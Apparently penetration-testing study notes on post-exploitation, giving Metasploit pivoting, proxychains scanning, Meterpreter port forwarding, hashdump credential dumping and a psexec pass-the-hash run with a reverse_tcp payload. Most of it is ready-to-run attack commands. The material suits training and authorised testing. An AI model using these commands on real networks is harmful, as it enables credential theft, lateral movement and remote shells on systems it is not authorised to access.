
---

* **Pivoting and Internal Network Scan**  
Pivoting allows us to move through the internal network easily and quickly, exploiting new hosts.  
```bash

* **Pivoting:**
    - Route traffic through compromised machines:
      - Add route in Metasploit: `route add 10.10.10.0 255.255.255.0 <session number>`
      - Use autoroute: `run autoroute -s 10.10.10.0/24`
      - Check routes: `autoroute -p`
    
* **Port Scanning via Pivot:**
    - Use `auxiliary/scanner/portscan/tcp` for TCP port scanning.
    - Example: `use auxiliary/scanner/portscan/tcp`

* **Proxy Setup (Metasploit + Proxychains):**
    - Set up Metasploit SOCKS4 proxy:
      - Module: `auxiliary/server/socks4a`
      - Set SRVHOST & SRVPORT (default is port 1080).
    - Configure Proxychains:
      - Update `/etc/proxychains.conf`: `socks4 127.0.0.1 1080`
    - Example command:
      - `proxychains nmap -sT -Pn -n <target IP> --top-ports 50`

* **Access Services via Proxychains:**
    - SSH: `proxychains ssh <target IP>`
    - Telnet: `proxychains telnet <target IP>`

* **Port Forwarding (Meterpreter):**
    - Forward local ports to internal network services:
      - `portfwd add -l <local port> -p <target port> -r <target IP>`
    - Example:
      - `portfwd add -l 3333 -p 3389 -r 10.10.10.5`
    - Use RDP:
      - `rdesktop 127.0.0.1:3333`
```

***The difference between local port forwarding and remote port forwarding lies in the direction of traffic flow and the type of service being exposed:***

|               | **Local Port Forwarding**                          | **Remote Port Forwarding**                            |
| ------------- | -------------------------------------------------- | ----------------------------------------------------- |
| **Direction** | Local port to remote service                       | Remote port to local service                          |
| **Purpose**   | Access remote service from local machine           | Expose local service to remote machine/network        |
| **Example**   | Forward RDP from an internal network to local port | Make local web server accessible to external machines |

Both techniques are used to bypass firewall restrictions and control access to services behind NAT or restrictive network policies.

***


At this stage, we apply privilege escalation and maintaining access techniques.

* **Pass-the-Hash Attack**  
- **Weakness**: Windows authentication protocols allow users to log in using hashed versions of passwords (NT or LM hashes) instead of cleartext passwords.  
- **Attack Vector**: If the same password is used across multiple machines, obtaining the hash from one host grants access to others, even without knowing the actual password.

* **Tools for Pass-the-Hash**  
- Metasploit and other tools are available to exploit this Windows weakness.  
- You only need the hashes, not the cracked passwords.

* **Dumping Hashes**  
- **Command**:  
  ```bash
  meterpreter > hashdump
  ```

* **Pass-the-Hash with Metasploit (psexec Module)**  
To run a pass-the-hash attack using the `psexec` module:

- **Configure the Module**:
  - **RHOST**: Target host (e.g., 10.10.10.5)
  - **SMBUser**: User account (e.g., els)
  - **SMBPass**: Password hash
  - **Payload**: Meterpreter or custom payload

- **Commands**:
  ```bash
  use exploit/windows/smb/psexec
  set RHOST 10.10.10.5
  set SMBUser els
  set SMBPass <NTLM hash>
  set PAYLOAD windows/meterpreter/reverse_tcp
  run
  ```

* **Post-Exploitation After Successful Exploit**  
Once you have a meterpreter session on a new machine, repeat the post-exploitation process to gather more information (e.g., services, hosts, networks).  

* **Notes**  
- Use proxychains with socks4a to pivot exploits if Metasploit doesn't have a module for the specific vulnerability.

---
